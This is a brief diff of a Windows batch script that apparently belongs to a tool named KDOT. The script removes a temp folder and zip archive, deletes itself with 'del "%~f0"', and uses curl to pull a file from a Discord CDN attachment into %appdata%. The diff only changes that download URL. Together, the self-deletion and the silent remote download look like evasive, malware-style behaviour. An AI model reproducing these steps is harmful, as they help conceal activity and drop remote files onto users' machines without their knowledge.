@@ -108,4 +108,4 @@ rmdir /s /q %localappdata%\Temp\KDOT
 del KDOT.zip
 timeout 3 > NUL
 start /b "" cmd /c del "%~f0"&exit /b
-curl -o %appdata%\mcnutt.mp4 https://cdn.discordapp.com/attachments/1038561326735302697/1038561829871423569/mcnutt.mp4
+curl -o %appdata%\mcnutt.mp4 https://cdn.discordapp.com/attachments/1031583091111768154/1048285820450242660/trim.BD21FB1B-0944-478E-AC40-D1E86955D01E.mov
